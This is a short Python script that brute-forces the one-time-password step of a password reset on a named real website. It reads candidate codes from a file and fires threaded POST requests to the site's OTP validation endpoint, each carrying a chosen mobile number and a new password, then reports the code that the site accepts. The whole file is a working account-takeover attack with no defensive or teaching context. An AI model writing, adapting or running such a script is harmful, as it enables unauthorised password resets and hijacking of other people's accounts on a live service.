import requests
import threading

def check_otp(mobile, passw, userotp):

    url = 'https://www.skillvertex.com/cgi/otpvalidation.cgi'
    payload = {'passw': passw, 'mobile': mobile, 'userotp': userotp}
    headers = {
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.skillvertex.com',
        'Referer': 'https://www.skillvertex.com/',
        'X-Requested-With': 'XMLHttpRequest'
    }
    response = requests.post(url, data=payload, headers=headers, cookies={})


    if 'invalid otp' in response.text.lower():
        pass
    else:
        print(f'{userotp}: OTP found')

mobile = input("Enter mobile number: ")
passw = input("Enter the new password: ")
otp_file = input("Enter the otp file :")
print("Wait for few minutes !!")

# read userotp from txt file
with open(otp_file, 'r') as file:
    userotps = file.read().strip().splitlines()

# create threads
threads = []
for userotp in userotps:
    thread = threading.Thread(target=check_otp, args=(mobile, passw, userotp))
    threads.append(thread)

# start threads
for thread in threads:
    thread.start()

for thread in threads:
    thread.join()
